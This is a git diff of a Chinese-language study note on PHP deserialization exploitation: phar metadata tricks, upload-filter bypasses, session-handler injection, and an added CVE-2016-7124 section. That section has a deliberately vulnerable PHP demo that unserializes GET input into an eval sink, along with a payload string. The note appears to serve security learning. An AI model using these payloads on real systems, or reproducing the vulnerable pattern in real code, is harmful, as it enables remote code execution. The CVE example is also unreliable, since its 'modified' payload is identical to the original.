@@ -54,7 +54,7 @@ O:<length>:"<class name>":<n>:{
 
 
 
-![](../daydayup.assets/image-20230717010044564.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230717010044564.png)
 
 此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞
 
@@ -104,7 +104,7 @@ print("number:".$fake['number']."\n");
 
 ```
 
-![](../daydayup.assets/image-20230717110730005.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230717110730005.png)
 
 ### phar反序列化
 
@@ -151,7 +151,7 @@ meta-data是以序列化的形式存储的
 
 php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下
 
-![](../daydayup.assets/1687876180147-90a3db65-cf9b-42a9-adf8-b6acf2582b52-16894035091502.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1687876180147-90a3db65-cf9b-42a9-adf8-b6acf2582b52-16894035091502.png)
 
 phar协议要求：
 
@@ -191,7 +191,7 @@ phar协议要求：
 ?>
 ```
 
-![](../daydayup.assets/image-20230717012512791.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230717012512791.png)
 
 #### 绕过phar关键字检测
 
@@ -221,7 +221,7 @@ php://filter/read=convert.base64-encode/resource=phar://phar.phar
 
 首先将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传）
 
-![](../daydayup.assets/image-20230717014558838.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230717014558838.png)
 
 ```
 filename=phar://pharppp.phar.gz/pharppp.phar
@@ -300,7 +300,7 @@ PHP 在存储 session 的时候会进行序列化，读取的时候会进行反�
 
 session 相关的信息，可以在 phpinfo 里查到：
 
-![](../daydayup.assets/image-20230802004423865.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802004423865.png)
 
 1. `session.auto_start`: 是否自动启动一个 session
 2. `session.save_path`: 设置 session 的存储路径
@@ -322,7 +322,7 @@ session 相关的信息，可以在 phpinfo 里查到：
 └─# php -d 'session.serialize_handler=php_serialize' ser_session.php
 ```
 
-![](../daydayup.assets/image-20230802010208399.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802010208399.png)
 
 **进行利用：**
 
@@ -332,7 +332,7 @@ session 相关的信息，可以在 phpinfo 里查到：
 
 phpinfo
 
-![](../daydayup.assets/image-20230802022848180.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802022848180.png)
 
 set_session.php
 
@@ -360,7 +360,7 @@ unserialize_session.php
     var_dump($_SESSION);
 ```
 
-![](../daydayup.assets/image-20230802022701424.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802022701424.png)
 
 php 引擎的格式为：键名 + `|` + 经过 `serialize()`/`unserialize()` 处理的值。那么对于这个例子来说，name 就是 `a:2:{s:5:"name0";s:6:"wi1shu";s:5:"name1";s:13:""`，`s:6:"wi1shu";}` 就是待反序列化的值。那么这里就非常清楚了，本质上就是通过 `|` 来完成注入（`"` 负责闭合引号，防止解析错误），让 php 引擎误以为前面全是 name，这样参与反序列化的数据就可以由我们来控制了。
 
@@ -390,8 +390,66 @@ $str = new f4ke();
 
 结合 set_session.php 就能够实现反序列化命令执行
 
-![](../daydayup.assets/image-20230802030859010.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802030859010.png)
 
-![](../daydayup.assets/image-20230802030934064.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802030934064.png)
 
-![](../daydayup.assets/image-20230802030952533.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802030952533.png)
+
+###  CVE-2016-7124
+
+这是一个 PHP 的 CVE，影响版本：
+
+1. PHP5 < 5.6.25
+2. PHP7 < 7.0.10
+
+当序列化字符串中表示对象中属性个数的数字，大于真正的属性个数时，就会跳过 `__wakeup` 函数的执行（会触发两个长度相关的 `Notice: Unexpected end of serialized data`）。
+
+demo.php
+
+```php
+<?php
+highlight_file(__FILE__);
+class A {
+    public $test;
+
+    function __wakeup() {
+        $this->test = new B;
+    }
+
+    function __destruct() {
+        $this->test->check();
+    }
+}
+
+class B {
+    function check() {
+        echo phpversion()."\n";
+    }
+}
+
+class C {
+    public $boom;
+    function check() {
+        eval($this->boom);
+    }
+}
+
+if (isset($_GET['payload'])){
+    $user = unserialize($_GET['payload']);
+}else{
+    $user = new A();
+    $user->test = new B();
+}
+```
+
+```
+O:1:"A":1:{s:4:"test";O:1:"C":1:{s:4:"boom";s:10:"phpinfo();";}}
+修改为
+O:1:"A":1:{s:4:"test";O:1:"C":1:{s:4:"boom";s:10:"phpinfo();";}}
+即可执行payload
+```
+
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802172523687.png)
+
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230802172704900.png)
